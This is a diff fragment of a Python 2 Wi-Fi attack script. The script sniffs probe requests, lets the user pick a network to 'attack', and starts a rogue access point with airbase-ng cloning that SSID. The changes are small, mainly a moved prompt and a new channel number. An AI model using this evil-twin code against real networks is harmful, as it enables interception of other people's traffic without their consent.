@@ -87,6 +87,7 @@ def choice():
         sys.exit()
     
     else:
+        print "\nType a number in the range (1,%s)" % (len(INDEX))
         while not number_is_correct:
             number_to_attack = input("Select which # you want to attack (type a number): ")
             
@@ -146,7 +147,7 @@ def fire_up_rogue_ap(ssid_to_attack, monitor_interface, internet_interface):
     
 
     try:
-        proc_rogue_ap = subprocess.Popen(["sudo", "airbase-ng", "-v", "-c", "11", "-e", ssid_to_attack, monitor_interface])
+        proc_rogue_ap = subprocess.Popen(["sudo", "airbase-ng", "-v", "-c", "6", "-e", ssid_to_attack, monitor_interface])
     except OSError as error:
         print >> sys.stderr, "Execution failed:", error
         proc_rogue_ap.kill()
@@ -220,7 +221,6 @@ def main():
         print "[%s] Starting scan \n" % datetime.now()
         print " #     Mac Client                   Probe request             Signal Strength"
     
-    
         try:
             while 1:
                 thread1 = Sniffing(monitor_interface)
@@ -233,8 +233,6 @@ def main():
             sendp(mon_ping, verbose=False)
         
         choice_correct = False
-        
-        print "\nType a number in the range (1,%s)" % (len(INDEX))
         while choice_correct is False:
             try:
                 ssid_to_attack = choice()
@@ -243,7 +241,7 @@ def main():
                 print "\n\n! Received keyboard interrupt, quitting choice ! \n"
                 sys.exit()
             except (SyntaxError, NameError):
-                print "\nType a number in the range (1,%s)" % (len(INDEX))
+                print ""
         
         try:
             proc = Process(target=fire_up_rogue_ap, args=(ssid_to_attack, monitor_interface, 
